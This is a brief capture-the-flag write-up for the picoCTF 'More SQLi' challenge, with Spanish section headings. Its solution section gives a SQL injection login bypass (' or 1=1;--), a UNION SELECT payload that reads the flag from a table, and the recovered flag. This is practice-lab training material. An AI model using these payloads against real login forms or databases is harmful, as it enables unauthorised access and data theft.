# More SQLi

## Objetivo
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59005/).

## Pistas

| No. Pista | Pista |
| --------- | ----- |
|           |       |


## Solucion
```
username:loquesea
password:' or 1=1;--

123' UNION SELECT flag, null, null from more_table;--
|   |   |
|---|---|
|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}||

```

## Notas adicionales

## Referencias